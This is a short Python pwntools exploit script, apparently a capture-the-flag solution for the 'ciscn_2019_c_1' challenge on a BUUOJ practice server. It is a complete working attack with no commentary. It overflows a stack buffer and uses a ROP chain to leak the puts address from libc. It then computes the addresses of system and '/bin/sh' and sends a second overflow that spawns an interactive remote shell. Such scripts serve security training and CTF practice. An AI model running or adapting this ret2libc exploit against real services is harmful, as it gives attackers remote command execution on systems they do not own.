# coding=utf-8
from pwn import *
from LibcSearcher import *
#context.log_level='debug'       #方便调试

p=remote("node3.buuoj.cn",25413)
elf=ELF('./ciscn_2019_c_1')
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
start_addr=elf.symbols["main"]
pop_rdi_addr=0x400c83

p.recvuntil("!\n")
p.sendline("1")
p.recvuntil("ed\n")

payload1="A" * 0x50 + 'jkjkjkjk' + p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
p.sendline(payload1)
p.recvuntil("Ciphertext\n")
p.recvuntil("\n")

puts_addr=u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))

print('puts_addr: ', hex(puts_addr))
libc=LibcSearcher("puts",puts_addr)
libcbase=puts_addr-libc.dump("puts")
system_addr=libcbase+libc.dump("system")
binsh_addr=libcbase+libc.dump("str_bin_sh")

p.recvuntil("!\n")
p.sendline("1")
p.recvuntil("ed\n")

ret_addr = 0x4006b9
payload2 = "A" * 0x50 + 'jkjkjkjk' + p64(ret_addr)
payload2 += p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload2)

p.interactive()

